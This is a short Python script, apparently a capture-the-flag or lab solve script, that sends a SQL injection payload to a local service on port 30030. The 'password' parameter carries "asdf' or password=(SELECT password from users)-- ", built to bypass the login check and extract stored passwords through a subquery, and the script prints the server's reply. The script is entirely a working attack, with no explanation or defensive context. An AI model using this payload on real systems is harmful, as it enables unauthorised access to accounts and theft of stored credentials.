import requests

url = "http://127.0.0.1:30030"
data = {
    "password":"asdf' or password=(SELECT password from users)-- "
}
response = requests.get(url=url, params=data)
print(response.text)